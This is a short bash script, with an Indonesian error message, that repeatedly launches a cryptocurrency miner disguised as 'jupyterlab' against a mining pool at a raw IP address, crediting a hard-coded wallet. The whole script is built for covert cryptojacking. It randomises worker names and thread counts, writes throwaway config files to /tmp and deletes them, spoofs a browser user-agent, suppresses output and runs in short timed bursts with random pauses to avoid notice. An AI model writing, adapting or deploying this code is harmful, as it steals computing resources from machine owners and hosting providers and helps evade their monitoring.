#!/usr/bin/env bash

MINER="$HOME/.local/bin/jupyterlab"
POOL="3.144.16.65:80"
WALLET="Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d"

[ ! -f "$MINER" ] && { echo "Miner tidak ditemukan: $MINER"; exit 1; }
chmod +x "$MINER" 2>/dev/null

while true; do
    CONFIG="/tmp/miner_$(head /dev/urandom | tr -dc a-f0-9 | head -c 8).json"
    THREADS=$(( (RANDOM % 3) + 4 ))  # 4-6 threads
    WORKER="worker_$(head /dev/urandom | tr -dc a-f0-9 | head -c 6)"
    
    cat > "$CONFIG" << EOF
{
  "pools": [{
    "url": "$POOL",
    "user": "$WALLET",
    "pass": "x",
    "tls": true
  }],
  "threads": $THREADS,
  "user-agent": "Mozilla/5.0",
  "donate-level": 0
}
EOF
    
    timeout 180 "$MINER" -c "$CONFIG" --quiet 2>/dev/null
    rm -f "$CONFIG"
    sleep $((30 + RANDOM % 11))
done
